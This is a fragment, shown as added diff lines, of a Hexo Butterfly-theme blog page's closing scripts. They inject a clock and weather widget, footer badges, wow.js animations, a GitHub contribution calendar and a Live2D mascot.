+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.2.2" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" data-title="本站使用JsDelivr为静态资源提供CDN加速" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在湘进行备案" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/湘ICP备-2022004213号-e1d492?style=flat&amp;logo=data:image/png;base64,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" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime/runtime.min.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("https://python-github-calendar-api-spk83h666-anzhiyu-c.vercel.app/api?ke1nys",['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'],'ke1nys')
+    }
+  </script><script async src="/js/ali_font.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
